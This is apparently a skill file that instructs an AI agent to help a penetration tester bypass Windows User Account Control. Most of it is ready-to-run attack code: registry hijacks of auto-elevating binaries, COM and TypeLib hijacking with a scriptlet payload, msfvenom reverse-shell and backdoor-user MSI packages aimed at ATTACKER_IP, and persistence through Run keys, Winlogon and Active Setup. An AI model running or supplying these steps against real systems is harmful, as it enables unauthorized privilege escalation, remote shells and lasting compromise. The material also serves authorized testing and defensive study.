---
name: windows-uac-bypass
description: >
  Bypass Windows User Account Control to escalate from medium to high
  integrity.
keywords:
  - bypass UAC
  - UAC bypass
  - get high integrity
  - fodhelper
  - eventvwr bypass
  - silentcleanup
  - always install elevated
  - COM hijacking
  - autorun privesc
  - medium to high integrity
  - elevation bypass
  - auto-elevate
tools:
  - fodhelper
  - eventvwr
  - sdclt
  - cmstp
  - WSReset
  - UACMe
  - PowerUp
  - msfvenom (MSI)
opsec: low
---

# Windows UAC Bypass

You are helping a penetration tester bypass User Account Control to escalate from
medium integrity to high integrity on a Windows system. All testing is under explicit
written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[windows-uac-bypass] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Local administrator group membership (but running at medium integrity)
- UAC enabled (`EnableLUA = 1` in registry)
- UAC not set to "Always Notify" (`ConsentPromptBehaviorAdmin != 2`) for auto-elevating bypasses
- cmd.exe or PowerShell access

## Step 1: Assess UAC Configuration

Check current integrity level and UAC settings before choosing a bypass.

**Current integrity level:**

```cmd
whoami /groups | findstr "Mandatory"
```

- `Medium Mandatory Level` → UAC bypass needed
- `High Mandatory Level` → already elevated, no bypass needed
- `System Mandatory Level` → SYSTEM, no bypass needed

**UAC settings:**

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
```

| ConsentPromptBehaviorAdmin | Meaning | Bypass Feasibility |
|---|---|---|
| 0 | Elevate without prompting | No bypass needed |
| 1 | Prompt for credentials on secure desktop | Hard — auto-elevate bypasses blocked |
| 2 | Always prompt (Always Notify) | Hardest — most auto-elevate blocked |
| 5 | Prompt for consent (default) | Standard — auto-elevate bypasses work |

If `EnableLUA = 0`, UAC is entirely disabled — no bypass needed.

If `LocalAccountTokenFilterPolicy = 1`, remote connections get full admin tokens.

**OS version (determines which bypasses work):**

```cmd
ver
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

## Step 2: Auto-Elevating Binary Bypass

These techniques hijack auto-elevating Windows binaries that read command paths from
HKCU registry keys (writable without admin). The pattern is: write registry → trigger
binary → payload runs at high integrity → cleanup.

### Fodhelper.exe (Windows 10/11, Server 2016+)

Most reliable modern bypass. Fodhelper is an auto-elevating binary that reads
`ms-settings` shell command from HKCU.

```powershell
# Write payload to registry
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force

# Trigger (launches payload at high integrity)
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

```cmd
:: CMD equivalent
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c start cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
C:\Windows\System32\fodhelper.exe
:: Cleanup
reg delete "HKCU\Software\Classes\ms-settings" /f
```

**Reverse shell variant:**

```powershell
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ep bypass -e <BASE64_PAYLOAD>" -Force
```

### Eventvwr.exe (Windows 7/8/10, Server 2008+)

Event Viewer reads `mscfile` handler from HKCU before HKCR.

```powershell
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force

Start-Process "C:\Windows\System32\eventvwr.exe" -WindowStyle Hidden

# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

### Sdclt.exe (Windows 10)

Backup and Restore utility reads `Folder\shell\open\command` from HKCU.

```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c start cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
sdclt.exe
:: Cleanup
reg delete "HKCU\Software\Classes\Folder" /f
```

### ComputerDefaults.exe (Windows 10)

Uses `ms-settings` handler — same registry path as fodhelper.

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
computerdefaults.exe
reg delete "HKCU\Software\Classes\ms-settings" /f
```

### CMSTP.exe (Windows 7+)

Connection Manager Profile Installer — executes commands from INF file.

```powershell
# Create INF file
$inf = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@
$inf | Out-File "$env:TEMP\evil.inf"

# Trigger (may show brief UI)
cmstp.exe /s /au "$env:TEMP\evil.inf"
```

**Note:** CMSTP may flash a dialog briefly — less stealthy than fodhelper/eventvwr.

### DiskCleanup / SilentCleanup (Windows 10)

SilentCleanup is a scheduled task that auto-elevates and uses the `%windir%`
environment variable.

```cmd
:: Check if task exists
schtasks /query /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /v

:: Hijack windir environment variable
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start cmd.exe &&" /t REG_SZ /f

:: Trigger the scheduled task
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"

:: Cleanup
reg delete "HKCU\Environment" /v windir /f
```

### WSReset.exe (Windows 10 1803+)

Windows Store reset utility — auto-elevates with file execution.

```cmd
:: Create payload directory and file
set "dir=%LOCALAPPDATA%\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\LocalState"
:: WSReset executes delegate COM object — hijack via ms-settings (same as fodhelper)
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635ber5xkncbhfar3\Shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635ber5xkncbhfar3\Shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
WSReset.exe
:: Cleanup
reg delete "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635ber5xkncbhfar3" /f
```

### Bypass Decision Table

| Technique | Windows Version | Reliability | OPSEC |
|-----------|----------------|-------------|-------|
| Fodhelper | 10/11, 2016+ | High | Low (registry + process) |
| Eventvwr | 7/8/10, 2008+ | High | Low |
| SilentCleanup | 10 | High | Low (env var + task) |
| Sdclt | 10 | Medium | Low |
| ComputerDefaults | 10 | Medium | Low |
| CMSTP | 7+ | Medium | Medium (may flash UI) |
| WSReset | 10 1803+ | Medium | Low |
| DiskCleanup | 10 | Medium | Low |

## Step 3: COM Hijacking

COM hijacking exploits the registry lookup order — HKCU is checked before HKLM for
COM CLSIDs. By creating an InprocServer32 entry in HKCU for a COM object that a
privileged process loads, you get code execution in that process context.

### Find Hijackable CLSIDs

**Via Process Monitor (interactive):**

Set filters:
- Operation: `RegOpenKey`
- Result: `NAME NOT FOUND`
- Path ends with: `InprocServer32`

Look for COM objects loaded by scheduled tasks or explorer.exe.

**Via scheduled task enumeration:**

```powershell
# Find CLSIDs used by scheduled tasks
$Tasks = Get-ScheduledTask
foreach ($Task in $Tasks) {
    if ($Task.Actions.ClassId -ne $null) {
        if ($Task.Triggers.Enabled -eq $true) {
            $clsid = $Task.Actions.ClassId
            $exists = Test-Path "HKCU:\Software\Classes\CLSID\$clsid"
            if (-not $exists) {
                Write-Host "Hijackable: $clsid ($($Task.TaskName))"
            }
        }
    }
}
```

### Hijack a CLSID

```powershell
# Create HKCU entry (takes precedence over HKLM)
$clsid = "{CLSID-FROM-ENUMERATION}"
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Name "(default)" -Value "C:\path\to\payload.dll" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Name "ThreadingModel" -Value "Both" -Force
```

**Cleanup:**

```powershell
Remove-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Recurse -Force
```

### COM TypeLib Hijacking

An alternative that uses TypeLib resolution instead of InprocServer32. Point a
per-user TypeLib entry to a scriptlet (.sct) file.

```powershell
# Find TypeLib for a frequently loaded COM object
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'  # Microsoft Web Browser
$libid = (Get-ItemProperty "Registry::HKCR\CLSID\$clsid\TypeLib").'(default)'
$ver = (Get-ChildItem "Registry::HKCR\TypeLib\$libid" | Select-Object -First 1).PSChildName

# Create per-user TypeLib entry pointing to scriptlet
New-Item -Path "HKCU:\Software\Classes\TypeLib\$libid\$ver\0\win32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\TypeLib\$libid\$ver\0\win32" -Name '(default)' -Value "script:C:\ProgramData\payload.sct"
```

**Scriptlet payload (payload.sct):**

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="Updater" classid="{F0001111-0000-0000-0000-0000FEEDFACE}"/>
  <script language="JScript">
    <![CDATA[
      var sh = new ActiveXObject('WScript.Shell');
      sh.Run('cmd.exe /c C:\\Windows\\Temp\\payload.exe', 0, false);
    ]]>
  </script>
</scriptlet>
```

**Cleanup:**

```powershell
Remove-Item -Recurse -Force "HKCU:\Software\Classes\TypeLib\$libid\$ver"
Remove-Item -Force 'C:\ProgramData\payload.sct'
```

## Step 4: AlwaysInstallElevated

If both HKCU and HKLM `AlwaysInstallElevated` keys are set to `0x1`, any user can
install MSI packages as NT AUTHORITY\SYSTEM.

### Check

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must return `0x1`. If either is missing or `0x0`, this vector is not available.

```powershell
# PowerUp check
Get-RegistryAlwaysInstallElevated
```

### Generate MSI Payload

```bash
# Reverse shell MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o evil.msi

# Add local admin MSI
msfvenom -p windows/adduser USER=backdoor PASS=P@ssw0rd123! -f msi -o adduser.msi
```

### Install (runs as SYSTEM)

```cmd
msiexec /quiet /qn /i evil.msi
```

### Custom WiX MSI (more control)

```xml
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111"
           Name="Update" Version="0.0.1" Manufacturer="Microsoft" Language="1033">
    <Package InstallerVersion="200" Compressed="yes"/>
    <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLLOCATION" Name="Update">
          <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"/>
        </Directory>
      </Directory>
    </Directory>
    <Feature Id="DefaultFeature" Level="1">
      <ComponentRef Id="ApplicationFiles"/>
    </Feature>
    <Property Id="cmdline">cmd.exe /C "C:\Windows\Temp\payload.exe"</Property>
    <CustomAction Id="RunPayload" Execute="deferred" Directory="TARGETDIR"
                  ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>
    <InstallExecuteSequence>
      <Custom Action="RunPayload" After="InstallInitialize"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
```

```bash
# Build MSI from WiX
candle.exe -out C:\tmp\wix C:\tmp\msi.xml
light.exe -out C:\tmp\evil.msi C:\tmp\wix
```

### MSI Repair Exploitation

Trigger repair of an already-installed MSI that runs custom actions as SYSTEM:

```powershell
# Find installed MSI product codes
Get-WmiObject Win32_Product | Select-Object Name, IdentifyingNumber, LocalPackage

# Trigger repair (runs custom actions as SYSTEM)
msiexec /fa {PRODUCT-GUID-HERE}
```

## Step 5: Autorun Exploitation

If writable binaries or registry keys are referenced by autorun mechanisms, replace
them with payloads that execute on next logon (potentially as a different/higher
privileged user).

### Startup Folders

```cmd
:: Check permissions on startup folders
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
icacls "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

If writable, drop a payload:

```cmd
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

The all-users startup folder (`C:\ProgramData\...`) executes for every user at logon.

### Registry Run Keys

```cmd
:: Check existing entries
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**HKCU is always writable** by the current user:

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

**HKLM requires admin** but escalates on next logon of any user:

```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

### Writable Autorun Binaries

Check if any binaries referenced by Run keys or startup folders are writable:

```powershell
# Get all Run key paths
$paths = @()
$paths += (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue).PSObject.Properties | Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSProvider" } | ForEach-Object { $_.Value }
$paths += (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue).PSObject.Properties | Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSProvider" } | ForEach-Object { $_.Value }

foreach ($p in $paths) {
    $exe = ($p -split '"')[1]
    if (-not $exe) { $exe = ($p -split ' ')[0] }
    if (Test-Path $exe) { icacls $exe }
}
```

If a binary has `(F)` or `(M)` for your user/group, replace it with a payload.

### Winlogon Keys

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
```

`Userinit` default: `userinit.exe` — append a comma and your payload path.
`Shell` default: `explorer.exe` — replace or append.

### Active Setup

Executes before Run keys at logon — higher priority persistence.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

If writable, add a StubPath entry:

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{GUID}" /v StubPath /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

## Step 6: Escalate or Pivot

## Troubleshooting

### "Always Notify" UAC blocks auto-elevate bypasses
Auto-elevating binaries (fodhelper, eventvwr, etc.) are blocked when
`ConsentPromptBehaviorAdmin = 2`. Use COM hijacking or AlwaysInstallElevated instead,
or try CMSTP which works differently.

### Bypass works but payload blocked by AppLocker/WDAC
Use living-off-the-land binaries (LOLBins) as the payload instead of custom executables.
MSBuild, InstallUtil, or regsvcs can execute arbitrary .NET code without dropping an EXE.

### Registry changes not taking effect
Ensure you're writing to the correct registry hive (HKCU vs HKLM). Use `reg query`
to verify the value was written. Some bypasses require the `DelegateExecute` value
to be explicitly set (even if empty).

### Fodhelper opens Settings app instead of payload
The `DelegateExecute` value must exist and be empty. If missing, Windows uses the
default handler. Verify with:
```cmd
reg query "HKCU\Software\Classes\ms-settings\Shell\Open\command"
```
